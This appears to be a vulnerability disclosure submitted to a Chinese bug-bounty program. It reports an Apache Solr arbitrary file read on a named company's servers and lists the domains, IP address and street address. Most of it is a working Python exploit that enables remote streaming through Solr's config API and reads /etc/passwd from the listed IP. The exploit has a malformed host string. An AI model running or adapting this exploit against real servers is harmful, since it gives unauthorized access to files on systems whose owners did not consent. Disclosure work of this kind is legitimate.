@@ -1,0 +1,41 @@
+厂商名称：杭州益耘数据科技有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://zcrin.com.cn:8983 http://www.zcrin.com.cn:8983 http://www.zcrin.com:8983 http://zcrin.com:8983
+网站名称：杭州益耘数据科技有限公司
+网站ip：112.126.58.46
+所属地区：浙江省杭州市余杭区余杭街道金星村西部科技园C幢612室
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：一般项目：大数据服务；信息系统集成服务；数据处理和存储支持服务；人工智能公共数据平台；人工智能基础资源与技术平台；生物质能资源数据库信息系统平台；卫星遥感数据处理；区块链技术相关软件和服务；互联网数据服务；物联网设备制造；物联网设备销售；市政设施管理；智能农业管理；智能水务系统开发；环境保护监测；工业控制计算机及系统制造；信息安全设备制造；虚拟现实设备制造；网络设备销售；信息安全设备销售；云计算设备销售；大气污染监测及检测仪器仪表制造；大气污染监测及检测仪器仪表销售；技术服务、技术开发、技术咨询、技术交流、技术转让、技术推广；资源循环利用服务技术咨询；乡镇经济管理服务；会议及展览服务；企业信用评级服务(除依法须经批准的项目外，凭营业执照依法自主开展经营活动)。许可项目：第二类增值电信业务；基础电信业务(依法须经批准的项目，经相关部门批准后方可开展经营活动，具体经营项目以审批结果为准)。
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://112.126.58.46:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
